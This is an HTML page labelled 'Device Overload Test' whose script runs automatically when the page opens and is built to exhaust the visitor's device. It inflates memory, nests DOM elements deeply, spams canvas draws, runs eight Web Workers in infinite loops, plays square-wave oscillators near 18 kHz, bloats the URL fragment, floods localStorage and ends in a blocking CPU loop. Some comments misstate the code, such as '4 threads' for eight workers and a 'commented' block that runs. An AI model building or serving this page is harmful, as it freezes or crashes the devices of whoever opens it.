<!DOCTYPE html>
<html>
<head>
  <title> Device Overload Test</title>
  <style>
    body {
      background: black;
      color: #0f0;
      font-family: monospace;
      overflow: hidden;
    }
    canvas {
      position: absolute;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
    }
  </style>
</head>
<body>
  <h1>🔥 Overloading Device...</h1>
  <canvas id="gpuCanvas"></canvas>
  <script>
    // 1. 🔥 Massive RAM Loader: Exponential memory balloon
    let ramEater = ["💣".repeat(1000)];
    for (let i = 0; i < 200; i++) {
      ramEater.push(ramEater.concat(ramEater));
    }

    // 2. 🔁 Infinite DOM Nesting: Triggers recursive layout engine calls
    const root = document.createElement("div");
    document.body.appendChild(root);
    let parent = root;
    for (let i = 0; i < 10000; i++) {
      const child = document.createElement("div");
      child.innerHTML = `<span>${"🔥".repeat(100)}</span>`;
      parent.appendChild(child);
      parent = child;
    }

    // 3. 🎨 GPU Canvas Spam
    const canvas = document.getElementById("gpuCanvas");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    function smashGPU() {
      for (let i = 0; i < 100000; i++) {
        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},1)`;
        ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 2, 2);
      }
      requestAnimationFrame(smashGPU);
    }
    smashGPU();

    // 4. ⚙️ Main CPU Loop (recursive burn)
    function burnCPU(depth = 0) {
      while (true) {
        Math.sqrt(Math.random() * Date.now()) + depth;
      }
    }

    // 5. 👷 Web Workers (4 threads)
    const workerBlob = new Blob([`while(true){Math.tan(Math.random()*Date.now())}`], {type: "application/javascript"});
    const workerURL = URL.createObjectURL(workerBlob);
    for (let i = 0; i < 8; i++) new Worker(workerURL);

    // 6. 🔊 Audio Oscillators
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      for (let i = 0; i < 6; i++) {
        const osc = audioCtx.createOscillator();
        osc.type = "square";
        osc.frequency.setValueAtTime(18000 + i * 100, audioCtx.currentTime);
        osc.connect(audioCtx.destination);
        osc.start();
        osc.stop(audioCtx.currentTime + 1);
      }
    } catch (e) {}

    // 7. 🚨 Fragment Overwrite (URL bomb)
    history.pushState({}, "", "#" + "X".repeat(500000));

    // 8. 🧠 Optional LocalStorage (commented, can crash Safari Mobile if repeated)
     try {
       for (let i = 0; i < 10000; i++) {
         localStorage.setItem(`key${i}`, "🧨".repeat(5000));
       }
    } catch (e) {}

    // 9. 🔥 Launch the final CPU meltdown
    setTimeout(() => burnCPU(), 50);

  </script>
</body>
</html>
